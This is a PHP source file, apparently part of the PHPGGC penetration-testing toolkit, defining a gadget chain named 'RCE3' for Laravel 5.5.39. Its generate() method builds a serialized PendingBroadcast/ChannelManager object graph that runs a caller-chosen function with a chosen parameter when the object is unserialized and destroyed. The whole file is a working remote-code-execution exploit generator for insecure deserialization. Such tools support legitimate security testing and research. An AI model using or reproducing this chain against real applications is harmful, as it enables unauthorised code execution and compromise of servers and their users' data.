<?php

namespace GadgetChain\Laravel;

class RCE3 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '5.5.39';
    public static $vector = '__destruct';
    public static $author = 'BlackFan';
    public static $informations = 'This chain triggers an ErrorException after code execution.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Illuminate\Broadcasting\PendingBroadcast(
            new \Illuminate\Notifications\ChannelManager($function, $parameter) 
        );
    }
}
